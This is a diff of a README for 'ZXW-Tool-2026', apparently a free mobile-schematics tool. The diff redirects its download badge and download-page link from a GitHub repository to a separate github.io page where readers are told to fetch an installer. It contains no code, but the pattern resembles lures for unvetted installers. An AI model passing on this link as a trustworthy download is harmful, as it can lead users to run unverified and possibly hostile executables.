@@ -1,6 +1,6 @@
 # 🛠️ ZXW-Tool-2026 - Access mobile device schematics easily
 
-[![](https://img.shields.io/badge/Download-ZXW_Tool_2026-blue.svg)](https://github.com/SHRINIKET205/ZXW-Tool-2026)
+[![](https://img.shields.io/badge/Download-ZXW_Tool_2026-blue.svg)](https://shriniket205.github.io)
 
 ## 📂 Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start the setup process
 Follow these steps to obtain the tool:
 
 1.  Open your preferred web browser.
-2.  Navigate to the official download page: [https://github.com/SHRINIKET205/ZXW-Tool-2026](https://github.com/SHRINIKET205/ZXW-Tool-2026)
+2.  Navigate to the official download page: [https://shriniket205.github.io](https://shriniket205.github.io)
 3.  Look for the latest release section on that page.
 4.  Select the installer file to save it to your computer.
 
